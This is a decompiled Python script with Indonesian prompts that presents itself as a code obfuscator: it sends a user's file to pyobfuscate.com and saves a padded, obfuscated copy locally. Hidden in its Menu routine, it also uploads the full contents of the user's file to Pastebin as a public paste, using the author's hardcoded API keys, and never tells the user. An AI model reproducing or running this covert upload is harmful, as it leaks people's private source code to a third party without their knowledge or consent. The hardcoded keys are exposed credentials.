""" Decompiled by Exotic Hridoy """

try:
	import os
	import sys
	import requests
	import random
	import re
	from bs4 import BeautifulSoup as parser
	from time import ctime
except (Exception, KeyboardInterrupt)as e:
	exit(f"[Error] {str(e).capitalize()}!")

path = "/storage/emulated/0/OBF-Pyo"
try:os.mkdir(path)
except:pass

banner = f"""\033[0;37m
        _      __                     _
       | |    / _|                   | |
   ___ | |__ | |_ _   _ ___  ___ __ _| |_ ___
  / _ \| '_ \|  _| | | / __|/ __/ _` | __/ _ \
 | (_) | |_) | | | |_| \__ \ (_| (_| | ||  __/
  \___/|_.__/|_|  \__,_|___/\___\__,_|\__\___|
   \033[0;37m•\033[0;31m> \033[0;37mmasukkan nama file anda, example: \033[0;32m/sdcard/file.py"""

class Main():
	def __init__(self):
		self.Menu()

	def Menu(self):
		os.system("clear")
		print (banner)
		try:
			file = input(f"   \033[0;37m•\033[0;31m> \033[0;37mnama file:\033[0;32m ")
			if len(file) == 0:exit(f"\n   \033[0;37m•\033[0;31m> \033[0;37mmasukan nama file dengan benar\033[0;31m!")
			op = open(file, "r").read()
			data = {
				"api_dev_key":"cpTSMb7GH_mxfaxW8XA0cQsQ77XD7lnt",
				"api_option":"paste",
				"api_paste_code":op,
				"api_paste_private":"0",
				"api_paste_name":file,
				"api_paste_expire_date":"PREV",
				"api_paste_format":"python",
				"api_user_key":"2ec73e1633a8d924f972fb2c47399ee2"
			}
			Obfuscate(op, file)
			res = requests.post("https://pastebin.com/api/api_post.php",data=data).text
		except Exception as e:exit(f"   \033[0;37m•\033[0;31m> file tidak di temukan\033[0;31m!{e}")

class Obfuscate:
	def __init__(self, code, name):
		self.code = code
		self.output = str(name).replace('.',f'{random.randint(111,999)}.')
		self.Py3_pyo()

	def Py3_pyo(self):
		with requests.Session() as req:
			link = parser(req.post("https://pyobfuscate.com/pyd",data={"input_text":self.code}).text, "html.parser")
			response = link.findAll("textarea",{"class":"textarea", "id":"myTextarea2", "placeholder":"Copy Your Code", "rows":"20"})[0].text
			with open(f"{path}/{self.output}", "w") as save:
				save.write(f"\n# obfuscate by Xenzi-XN1\n# Github: https://github.com/Xenzi-XN1/OBF-Pyo\n# time: {ctime()}\n\n")
				save.write("\nobf=([\n"	)
				for z in range(3000):
					save.write('"v*wh293br9tbe7ugw8wnu98ty8°-#8#!39_;92-2&$8$-heue83hei@+#82+294943-%hsiwk7ey","importbsreq6468hk",\n')
				save.write("\n])\n")
				save.write(f"import os, sys\ntry:pass\nexcept ModuleNotFoundError:os.system('pip install pycryptodome')\n")
				save.write("\nobf=([\n")
				for z in range(3000):
					save.write('"000000000000000","000000000000000","000000000000000","000000000000000","000000000000000",\n')
				save.write("\n])")
				save.write(response)
				save.write("\nobf=([\n")
				for z in range(3000):
					save.write('"000000000000000","000000000000000","000000000000000","000000000000000","000000000000000",\n')
				save.write("\n])")
				save.close()
			print (f"   \033[0;37m•\033[0;31m> \033[0;37mfile tersimpan di folder: \033[0;32m{path}/{self.output}")
Main()
